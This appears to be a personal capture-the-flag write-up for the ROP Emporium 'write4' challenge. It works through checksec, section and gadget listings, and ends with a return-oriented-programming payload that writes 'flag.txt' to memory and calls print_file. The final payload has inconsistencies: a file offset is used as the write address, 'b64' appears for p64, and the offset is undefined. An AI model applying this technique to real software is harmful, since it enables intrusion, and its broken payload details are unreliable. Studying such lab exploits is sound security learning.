# 04: write4


https://ropemporium.com/binary/write4.zip


Call print_file(), PLT entry exists
Arg1=address of the file name
Build "flag.txt" string
   Where store string : check out sections with write permissions.
   get gadgets write: mov [reg], reg; ret

   b'flag.txt' fit in a register
   

## checksec 

```
$ checksec write4
[*] '/home/yolo/yolo/BufferOverflows/ropemporium/04_write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found       <-- overflow ok
    NX:       NX enabled            <-- no asm payload 
    PIE:      No PIE (0x400000)     <-- easy address 
    RUNPATH:  b'.'
```

## Functions

```
$ r2 write4
[0x00400520]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400520]> afl
0x00400520    1 42           entry0
0x004004d0    3 23           sym._init
0x004006a4    1 9            sym._fini
0x00400560    4 42   -> 37   sym.deregister_tm_clones
0x00400590    4 58   -> 55   sym.register_tm_clones
0x004005d0    3 34   -> 29   entry.fini0
0x00400600    1 7            entry.init0
0x00400617    1 17           sym.usefulFunction
0x00400510    1 6            sym.imp.print_file
0x004006a0    1 2            sym.__libc_csu_fini
0x00400630    4 101          sym.__libc_csu_init
0x00400550    1 2            sym._dl_relocate_static_pie
0x00400607    1 16           main
0x00400500    1 6            sym.imp.pwnme
```

print_file_addr = b64(0x00400510)


## Where

```
$ r2 write4
[0x00400520]> aaaa
[0x00400520]> iS 
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI_tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build_id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- .shstrtab
```

Let write in .got or .bss or .data


```
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
```

writable_addr      = p64(0x0000000000601038)

Got section basically can contain addresses of Global variables and functions. 
All the global variables are in the first couple of slots and suffix is all pointers to functions. 
gotplt is the first slot .got that contains only the addresses of function..
Eventually after function addresses are resolved via means of plt. The resolved address goes into .gotplt which btw is inside .got

.bss  contains statically allocated variables that are declared but have not been assigned a value yet.
.data section contains the data itself,

## Gadgets to write


```
0000000000400628 <usefulGadgets>:
  400628:	4d 89 3e             	mov    %r15,(%r14)
  40062b:	c3                   	retq   
  40062c:	0f 1f 40 00          	nopl   0x0(%rax)
```

```
$ gdb write4
gdb-peda$ disassemble usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:	mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:	ret    
   0x000000000040062c <+4>:	nop    DWORD PTR [rax+0x0]
End of assembler dump.
```

```
$ ropper -f write4 | grep mov
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
...
0x0000000000400629: mov dword ptr [rsi], edi; ret; 
...
0x0000000000400628: mov qword ptr [r14], r15; ret; 
```

write_to = p64(0x0000000000400628)


## Gadgets to set r15 et r14

```
$ ropper -f write4 | grep r15
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400628: mov qword ptr [r14], r15; ret; 
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040068e: pop r13; pop r14; pop r15; ret; 
0x0000000000400690: pop r14; pop r15; ret; 
0x0000000000400692: pop r15; ret; 
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040068f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400691: pop rsi; pop r15; ret; 
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret; 
```


0x0000000000400690: pop r14; pop r15; ret; 
gadget_pop_r14_r15 = p64(0x0000000000400690)


## Gadgets to set rdi

```$ ropper -f write4 | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400693: pop rdi; ret; 
```


## Payload 

writable_addr      = p64(0x00001038)
gadget_pop_r14_r15 = p64(0x0000000000400690)
val_r14            = writable_addr
val_r15            = b"flag.txt"   # put value in r15
write_to           = p64(0x0000000000400628)
gadget_pop_rdi     = p64(0x0000000000400693)
print_file_addr    = b64(0x00400510)
payload = b'A'*offset + gadget_pop_r14_r15 + val_r14 + val_r15 + write_to + gadget_pop_rdi + writable_addr + print_file_addr

## 